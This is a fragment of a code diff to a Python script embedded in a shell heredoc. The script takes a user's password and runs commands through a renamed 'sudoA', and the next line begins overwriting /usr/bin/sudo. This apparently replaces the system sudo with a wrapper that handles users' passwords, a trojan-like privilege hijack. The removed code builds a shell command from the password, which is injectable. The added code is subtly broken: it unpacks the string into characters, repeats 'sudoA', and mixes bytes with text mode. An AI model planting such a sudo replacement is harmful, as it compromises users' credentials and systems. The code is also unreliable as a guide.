@@ -50,8 +50,11 @@ def runShell(password):
             command = "sudoA -S "+option
             runCommand(password, command)
 def runCommand(password, command):
-    command = "echo "+password+" | "+command
-    os.system(command)
+    try:
+        result = subprocess.run(['sudoA', '-S', *command], input=password.encode(), capture_output=True, text=True, check=True)
+        print(result.stdout)
+    except subprocess.CalledProcessError as e:
+        print(e)
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
